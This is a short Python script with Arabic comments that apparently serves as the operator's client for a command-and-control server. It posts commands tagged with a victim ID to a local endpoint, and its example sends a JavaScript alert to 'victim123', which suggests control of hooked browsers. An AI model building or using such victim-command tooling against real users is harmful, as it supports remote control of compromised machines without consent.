import requests
import json

def send_command(victim_id, command):
    url = 'http://localhost:5000/send_command'
    try:
        response = requests.post(
            url,
            json={
                'victim_id': victim_id,
                'command': command
            },
            timeout=5
        )
        
        # التحقق من حالة الرد أولاً
        if response.status_code == 200:
            try:
                return response.json()
            except json.JSONDecodeError:
                print("الخادم لم يرجع بيانات JSON صالحة")
                print("الرد الخام:", response.text)
                return None
        else:
            print(f"خطأ في الخادم: {response.status_code}")
            print("الرد الخام:", response.text)
            return None
            
    except requests.exceptions.RequestException as e:
        print(f"خطأ في الاتصال: {str(e)}")
        return None

if __name__ == "__main__":
    # مثال للاستخدام
    result = send_command('victim123', 'alert("hello")')
    if result:
        print("تم إرسال الأمر بنجاح:")
        print(json.dumps(result, indent=2))
